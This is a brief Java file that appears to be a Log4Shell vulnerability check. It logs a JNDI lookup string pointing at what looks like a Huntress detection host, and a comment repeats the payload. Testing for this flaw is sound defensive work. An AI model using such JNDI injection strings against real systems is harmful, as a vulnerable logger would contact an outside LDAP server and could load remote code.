package MyPackage;

import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

public class Webserver {
    static Logger log = LogManager.getLogger(Webserver.class);

    public static void main(String[] aaa) {
        log.error("${jndi:ldap://log4shell.huntress.com:1389/uuid...}");
    }
}


// ${jndi:ldap://log4shell.huntress.com:1389/es=5.6.16/f41b8ed0-ce99-4adf-ac00-6bc92c033828}